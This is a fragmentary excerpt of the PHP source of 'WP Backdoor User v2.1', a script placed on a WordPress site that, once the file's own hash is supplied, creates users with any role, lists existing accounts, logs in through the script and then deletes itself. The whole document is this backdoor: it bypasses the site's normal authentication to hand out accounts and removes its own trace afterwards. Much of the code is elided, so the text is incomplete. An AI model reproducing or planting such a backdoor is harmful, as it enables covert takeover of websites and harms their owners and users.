...
Script URI: http://www.boiteaweb.fr/plugin-backdoor-user-3311.html
...
BE CAREFUL!!!
Script modified by Fanchy <fanchy@hotmail.fr>
...
// Check MD5 hash for security reasons
if(empty($_GET) || !isset($_GET['hash']) || $_GET['hash'] !== hash_file('md5', __FILE__)) die("You don't have the permission to access this file!"); 

// Force the file to be renamed for security reasons
if(strtolower(basename(__FILE__)) == 'wp-backdoor-user.php') die("Please rename the file before use!");
...
if(isset($_REQUEST['action'])) :
	...
	switch($_REQUEST['action']) :
		...
		case 'create_user':
			...
			if(username_exists($new_user_login)) wp_die(new WP_Error('existing_user_login', __('This username is already registered.')));

			// Create this user
			$my_user_id = wp_create_user($new_user_login, $new_user_pass, $new_user_email);
			  
			// Problem on creation ? Stop script
			if(is_wp_error($my_user_id)) wp_die(new WP_Error('registerfail', sprintf(__('<strong>ERROR</strong>: Couldn&#8217;t register you... please contact the <a href="mailto:%s">webmaster</a> !'), esc_attr(get_option('admin_email')))));
			...
			if(isset($_REQUEST['log_in'])) :
				...
				if($delete_file) unlink(__FILE__);
...
$select_roles = '';
foreach($roles as $krole => $i18nrole) $select_roles .= '<option value="' . $krole . '">' . $i18nrole . '</option>' . "\n";
...
if(function_exists('get_users')){
	...
	foreach ($usersID as $uid) $all_users[] = get_userdata($uid);
}
...
foreach($all_users as $user) :
	...
	if(isset($the_user->roles[0])) $select_users .= '<option value="' . $user->ID . '">' . $user->user_login . ' (' . $the_user->roles[0] . ')</option>' . "\n";
endforeach;
...
<html lang="en">
	<head>
		...
		<title>WP Backdoor User v2.1</title>
		...
		<footer class="footer" role="siteinfo">
			<div class="container">
				...
				<p class="text-muted text-xs-center">
					~ <a href="https://github.com/BoiteAWeb/WP-Backdoor-User/" target="_blank">WP Backdoor User v2.1</a> ~ <a href="mailto:julio@boiteaweb.fr" target="_blank">julio@boiteaweb.fr</a> ~ <a href="http://www.boiteaweb.fr" target="_blank">http://www.boiteaweb.fr</a> ~ <a href="http://twitter.com/boiteaweb" target="_blank">@boiteaweb</a> ~
				</p>
				-->
				<div class="row">
